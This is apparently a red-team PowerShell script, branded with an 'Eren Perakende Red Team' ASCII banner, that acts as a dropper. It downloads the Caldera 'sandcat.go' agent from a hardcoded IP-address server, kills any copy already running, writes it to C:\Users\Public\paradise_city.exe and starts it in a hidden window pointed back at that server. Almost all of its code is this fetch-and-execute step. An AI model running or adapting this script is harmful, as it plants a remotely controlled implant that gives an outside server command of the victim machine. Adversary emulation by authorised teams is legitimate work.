param (
    [string]$FilePath = "."
)

Clear-Host
Write-Host ""
Write-Host ""
Write-Host -Fore Red 
"
                                                                                                                           
@@@@@@@    @@@@@@   @@@@@@@    @@@@@@   @@@@@@@   @@@   @@@@@@   @@@@@@@@       @@@@@@@    @@@@@@     @@@ 
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@@       @@@@@@@@  @@@@@@@    @@@@ 
@@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  !@@       @@!            @@!  @@@  !@@       @@@!! 
!@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  !@!  !@!       !@!            !@!  @!@  !@!         !@! 
@!@@!@!   @!@!@!@!  @!@!!@!   @!@!@!@!  @!@  !@!  !!@  !!@@!!    @!!!:!         @!@@!@!   !!@@!!      @!@ 
!!@!!!    !!!@!!!!  !!@!@!    !!!@!!!!  !@!  !!!  !!!   !!@!!!   !!!!!:         !!@!!!     !!@!!!     !@! 
!!:       !!:  !!!  !!: :!!   !!:  !!!  !!:  !!!  !!:       !:!  !!:            !!:            !:!    !!: 
:!:       :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  :!:      !:!   :!:       :!:  :!:           !:!     :!: 
 ::       ::   :::  ::   :::  ::   :::   :::: ::   ::  :::: ::    :: ::::  :::   ::       :::: ::     ::: 
 :         :   : :   :   : :   :   : :  :: :  :   :    :: : :    : :: ::   :::   :        :: : :       :: 

" 
Write-Host -Fore Red "          Eren Perakende Red Team" 
Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
Write-Host ""
Write-Host ""

$server="http://78.129.240.79:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\paradise_city.exe"} | stop-process -f;
rm -force "C:\Users\Public\paradise_city.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\paradise_city.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\paradise_city.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;